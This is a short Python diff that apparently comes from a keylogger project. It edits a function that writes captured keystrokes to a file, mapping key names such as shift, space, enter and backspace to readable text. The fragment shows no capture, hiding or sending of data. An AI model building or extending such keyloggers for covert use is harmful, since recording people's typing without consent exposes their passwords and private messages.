@@ -8,9 +8,10 @@ import tempfile
 # functions
 def writetofile(key):
     char = str(key)
+    char = char.replace("'", "")
     # replacing keystrokes in file.txt with actual meaning
-    keystroke = ["'",'Key.shift', 'Key.space', 'Key.enter', 'Key.backspace','Key.ctrl_l']
-    value = ["", "", " ", "\n", '<backspace>', '']
+    keystroke = ['Key.shift', 'Key.space', 'Key.enter', 'Key.backspace','Key.ctrl_l']
+    value = ["", " ", "\n", '<backspace>', '']
     for j in range(len(keystroke)):
         if keystroke[j] == char:
             char = char.replace(keystroke[j], value[j])
